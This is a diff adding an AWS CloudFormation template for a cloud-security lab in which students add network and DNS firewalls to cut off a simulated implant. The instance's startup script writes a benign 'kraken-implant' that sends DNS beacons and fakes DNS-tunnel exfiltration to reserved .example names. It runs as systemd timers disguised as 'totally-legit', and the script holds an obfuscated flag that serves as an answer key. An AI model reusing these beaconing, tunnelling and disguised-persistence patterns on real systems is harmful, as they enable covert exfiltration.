@@ -1,0 +1,246 @@
+AWSTemplateFormatVersion: "2010-09-09"
+Description: >
+  Operation Skyfortress - Day 3 / Lab 3.1 "Cut the Kraken's Line" + Boss "DNS Tunnel Escape".
+  Builds a 3-tier egress VPC (public/NAT, firewall, private workload) with a BENIGN
+  "kraken-implant" simulator on a private EC2 instance. Initially the private subnet routes
+  straight to the NAT gateway (no inspection). Students insert AWS Network Firewall and
+  Route 53 Resolver DNS Firewall. The simulator only performs DNS lookups of non-existent
+  .example names and HTTP(S) requests to example.com (IANA reserved). No host data leaves.
+  COST: NAT gateway ~$0.045/hr + t3.micro. Network Firewall (added by students) ~$0.395/hr.
+
+Parameters:
+  LatestAmiId:
+    Type: AWS::SSM::Parameter::Value<AWS::EC2::Image::Id>
+    Default: /aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64
+
+Resources:
+  Vpc:
+    Type: AWS::EC2::VPC
+    Properties:
+      CidrBlock: 10.66.0.0/16
+      EnableDnsSupport: true
+      EnableDnsHostnames: true
+      Tags: [{ Key: Name, Value: skyfortress-egress-vpc }]
+
+  Igw:
+    Type: AWS::EC2::InternetGateway
+    Properties:
+      Tags: [{ Key: Name, Value: skyfortress-igw }]
+  IgwAttach:
+    Type: AWS::EC2::VPCGatewayAttachment
+    Properties: { VpcId: !Ref Vpc, InternetGatewayId: !Ref Igw }
+
+  PublicSubnet:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId: !Ref Vpc
+      CidrBlock: 10.66.0.0/24
+      AvailabilityZone: !Select [0, !GetAZs ""]
+      Tags: [{ Key: Name, Value: sky-public-nat }]
+  FirewallSubnet:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId: !Ref Vpc
+      CidrBlock: 10.66.1.0/28
+      AvailabilityZone: !Select [0, !GetAZs ""]
+      Tags: [{ Key: Name, Value: sky-firewall }]
+  PrivateSubnet:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId: !Ref Vpc
+      CidrBlock: 10.66.2.0/24
+      AvailabilityZone: !Select [0, !GetAZs ""]
+      Tags: [{ Key: Name, Value: sky-private-workload }]
+
+  NatEip:
+    Type: AWS::EC2::EIP
+    DependsOn: IgwAttach
+    Properties: { Domain: vpc }
+  Nat:
+    Type: AWS::EC2::NatGateway
+    Properties:
+      SubnetId: !Ref PublicSubnet
+      AllocationId: !GetAtt NatEip.AllocationId
+      Tags: [{ Key: Name, Value: sky-nat }]
+
+  PublicRT:
+    Type: AWS::EC2::RouteTable
+    Properties: { VpcId: !Ref Vpc, Tags: [{ Key: Name, Value: sky-rt-public }] }
+  PublicDefault:
+    Type: AWS::EC2::Route
+    DependsOn: IgwAttach
+    Properties: { RouteTableId: !Ref PublicRT, DestinationCidrBlock: 0.0.0.0/0, GatewayId: !Ref Igw }
+  PublicAssoc:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties: { SubnetId: !Ref PublicSubnet, RouteTableId: !Ref PublicRT }
+
+  FirewallRT:
+    Type: AWS::EC2::RouteTable
+    Properties: { VpcId: !Ref Vpc, Tags: [{ Key: Name, Value: sky-rt-firewall }] }
+  FirewallDefault:
+    Type: AWS::EC2::Route
+    Properties: { RouteTableId: !Ref FirewallRT, DestinationCidrBlock: 0.0.0.0/0, NatGatewayId: !Ref Nat }
+  FirewallAssoc:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties: { SubnetId: !Ref FirewallSubnet, RouteTableId: !Ref FirewallRT }
+
+  PrivateRT:
+    Type: AWS::EC2::RouteTable
+    Properties: { VpcId: !Ref Vpc, Tags: [{ Key: Name, Value: sky-rt-private }] }
+  PrivateDefault:
+    # STARTING STATE: straight to NAT, no inspection. Students re-point this at the firewall endpoint.
+    Type: AWS::EC2::Route
+    Properties: { RouteTableId: !Ref PrivateRT, DestinationCidrBlock: 0.0.0.0/0, NatGatewayId: !Ref Nat }
+  PrivateAssoc:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties: { SubnetId: !Ref PrivateSubnet, RouteTableId: !Ref PrivateRT }
+
+  # Private hosted zone that holds the DNS Firewall sinkhole target
+  LabZone:
+    Type: AWS::Route53::HostedZone
+    Properties:
+      Name: skyfortress.lab
+      VPCs: [{ VPCId: !Ref Vpc, VPCRegion: !Ref AWS::Region }]
+  Sinkhole:
+    Type: AWS::Route53::RecordSet
+    Properties:
+      HostedZoneId: !Ref LabZone
+      Name: sinkhole.skyfortress.lab
+      Type: A
+      TTL: "60"
+      ResourceRecords: [10.66.255.254]
+
+  NfwAlertLogs:
+    Type: AWS::Logs::LogGroup
+    Properties: { LogGroupName: /skyfortress/nfw/alert, RetentionInDays: 3 }
+  NfwFlowLogs:
+    Type: AWS::Logs::LogGroup
+    Properties: { LogGroupName: /skyfortress/nfw/flow, RetentionInDays: 3 }
+  DnsQueryLogs:
+    Type: AWS::Logs::LogGroup
+    Properties: { LogGroupName: /skyfortress/dns/query, RetentionInDays: 3 }
+
+  WorkloadSG:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: Workload - no inbound, all outbound (egress control is the firewall's job today)
+      VpcId: !Ref Vpc
+      SecurityGroupEgress: [{ IpProtocol: "-1", CidrIp: 0.0.0.0/0 }]
+
+  InstanceRole:
+    Type: AWS::IAM::Role
+    Properties:
+      RoleName: !Sub skyfortress-lab31-instance-${AWS::Region}
+      AssumeRolePolicyDocument:
+        Version: "2012-10-17"
+        Statement: [{ Effect: Allow, Principal: { Service: ec2.amazonaws.com }, Action: sts:AssumeRole }]
+      ManagedPolicyArns: [arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore]
+  InstanceProfile:
+    Type: AWS::IAM::InstanceProfile
+    Properties: { Roles: [!Ref InstanceRole] }
+
+  CargoBox:
+    Type: AWS::EC2::Instance
+    DependsOn: PrivateDefault
+    Properties:
+      ImageId: !Ref LatestAmiId
+      InstanceType: t3.micro
+      SubnetId: !Ref PrivateSubnet
+      SecurityGroupIds: [!Ref WorkloadSG]
+      IamInstanceProfile: !Ref InstanceProfile
+      MetadataOptions: { HttpTokens: required, HttpPutResponseHopLimit: 1 }
+      Tags: [{ Key: Name, Value: nimbus-cargo-box-07 }]
+      UserData:
+        Fn::Base64: |
+          #!/bin/bash
+          set -euxo pipefail
+          dnf install -y bind-utils
+          mkdir -p /opt/kraken
+          cat > /opt/kraken/implant.sh <<'IMPLANT'
+          #!/bin/bash
+          # kraken-implant.sh - BENIGN training simulator for Operation Skyfortress.
+          # beacon : DNS lookups of *.kraken-c2.example (via VPC resolver and 8.8.8.8) + HTTP(S) to example.com
+          # tunnel : "exfiltrates" a training string as DNS labels under *.kraken-tunnel.example
+          # status : reports which channels are still open
+          C2="beacon.kraken-c2.example"
+          LOG=/var/log/kraken-implant.log
+          UA="kraken-implant/2.6 (+tentacle)"
+          beacon() {
+            dig +short +time=2 +tries=1 "$C2" >/dev/null 2>&1 || true
+            dig +short +time=2 +tries=1 @8.8.8.8 "$C2" >/dev/null 2>&1 || true
+            curl -s -m 5 -o /dev/null -A "$UA" http://example.com/checkin || true
+            curl -s -m 5 -o /dev/null -A "$UA" https://example.com/ || true
+            echo "$(date -Is) beacon sent" >> "$LOG"
+          }
+          tunnel() {
+            local p; p=$(echo "upmlz4gxvou3xixsjodlzgxpvmmtysgzjofd56vq5ltl26vzzne36svfnk" | rev)
+            local i=0
+            for chunk in "${p:0:20}" "${p:20:20}" "${p:40}"; do
+              dig +short +time=2 +tries=1 "0${i}-${chunk}.x.kraken-tunnel.example" >/dev/null 2>&1 || true
+              i=$((i+1)); sleep 1
+            done
+            echo "$(date -Is) tunnel burst sent" >> "$LOG"
+          }
+          status() {
+            local dns ext http https aws
+            dig +short +time=3 +tries=1 "$C2" 2>/dev/null | grep -q sinkhole && dns=SEVERED || dns=OPEN
+            dig +time=3 +tries=1 @8.8.8.8 example.com >/dev/null 2>&1 && ext=OPEN || ext=SEVERED
+            curl -s -m 6 -o /dev/null -A "$UA" http://example.com/  && http=OPEN  || http=SEVERED
+            curl -s -m 6 -o /dev/null -A "$UA" https://example.com/ && https=OPEN || https=SEVERED
+            curl -s -m 6 -o /dev/null https://ssm.us-east-1.amazonaws.com/ && aws=REACHABLE || aws=DOWN
+            printf '\n  KRAKEN IMPLANT STATUS\n  ---------------------\n'
+            printf '  C2 via VPC resolver ........ %s\n' "$dns"
+            printf '  C2 via rogue resolver 8.8.8.8 %s\n' "$ext"
+            printf '  HTTP exfil (example.com) ... %s\n' "$http"
+            printf '  HTTPS exfil (example.com) .. %s\n' "$https"
+            printf '  AWS APIs (business traffic)  %s\n\n' "$aws"
+            if [ "$aws" = DOWN ]; then
+              echo "  Owlsley: You cut the POWER, not the line. Business traffic is down too. Fix your routes."; return
+            fi
+            if [ "$dns$ext$http$https" = SEVEREDSEVEREDSEVEREDSEVERED ]; then
+              echo "  Kraken: ...the line is cut. All channels severed. Fine. FINE."
+              echo "  >> $(echo 'fWRlcmV2ZXNfc2xlbm5haGNfbGxhe1lLUwo=' | base64 -d | rev)"
+            else
+              echo "  Kraken: hehehe. I can still hear the mothership."
+            fi
+          }
+          case "${1:-beacon}" in beacon) beacon ;; tunnel) tunnel ;; status) status ;; esac
+          IMPLANT
+          chmod 755 /opt/kraken/implant.sh
+          for m in beacon tunnel; do
+          cat > /etc/systemd/system/kraken-$m.service <<EOF
+          [Unit]
+          Description=totally-legit-$m
+          [Service]
+          Type=oneshot
+          ExecStart=/opt/kraken/implant.sh $m
+          EOF
+          done
+          cat > /etc/systemd/system/kraken-beacon.timer <<'EOF'
+          [Timer]
+          OnBootSec=60
+          OnUnitActiveSec=60
+          [Install]
+          WantedBy=timers.target
+          EOF
+          cat > /etc/systemd/system/kraken-tunnel.timer <<'EOF'
+          [Timer]
+          OnBootSec=90
+          OnUnitActiveSec=120
+          [Install]
+          WantedBy=timers.target
+          EOF
+          systemctl daemon-reload
+          systemctl enable --now kraken-beacon.timer kraken-tunnel.timer
+
+Outputs:
+  VpcId: { Value: !Ref Vpc }
+  PublicSubnetId: { Value: !Ref PublicSubnet }
+  FirewallSubnetId: { Value: !Ref FirewallSubnet }
+  PrivateSubnetId: { Value: !Ref PrivateSubnet }
+  PublicRouteTableId: { Value: !Ref PublicRT }
+  FirewallRouteTableId: { Value: !Ref FirewallRT }
+  PrivateRouteTableId: { Value: !Ref PrivateRT }
+  NatGatewayId: { Value: !Ref Nat }
+  InstanceId: { Value: !Ref CargoBox }
+  DnsQueryLogGroupArn: { Value: !GetAtt DnsQueryLogs.Arn }
